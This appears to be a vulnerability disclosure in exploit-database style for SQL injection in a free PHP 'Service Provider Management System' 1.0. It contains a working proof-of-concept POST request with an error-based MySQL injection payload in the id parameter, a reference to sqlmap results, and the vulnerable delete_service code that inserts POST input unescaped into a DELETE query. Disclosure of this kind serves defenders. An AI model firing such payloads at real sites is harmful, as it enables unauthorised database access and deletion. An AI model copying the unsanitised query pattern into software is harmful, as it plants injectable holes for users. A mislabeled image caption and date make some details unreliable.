### Exploit Title: Service Provider Management System - SQL injections
### Date: 2023-05/11
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/download-code?nid=16501&title=Service+Provider+Management+System+using+PHP+and+MySQL+Source+Code+Free+Download
### Version: 1.0
### Tested on: macOs 13.3.1 (a) + phpstudy


# 1./classes/Master.php
/classes/Master.php SQL injection exists for parameter Section

### Sample request POC #1

```
POST /classes/Master.php?f=delete_service HTTP/1.1
Host: 10.211.55.3:8001
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 114

id='+AND+GTID_SUBSET(CONCAT(0x717a6a7071%2Cmd5(1)%2C(SELECT+(ELT(8125%3D8125%2C1)))%2C0x71707a7071)%2C8125)--+jKyA
```
### Sqlmap running results
![blockchain](https://github.com/xiahao90/CVEproject/raw/main/imgs/1683792001887.jpg "AC Repair and Services System - SQL injections")

### Related Codes /classes/Master.php
...
function delete_service(){
	extract($_POST);
	$del = $this->conn->query("DELETE FROM `service_list` where id = '{$id}'");
	if($del){
		$resp['status'] = 'success';
		$this->settings->set_flashdata('success'," Service successfully deleted.");
	}else{
		$resp['status'] = 'failed';
		$resp['error'] = $this->conn->error;
	}
	return json_encode($resp);

}
...
```
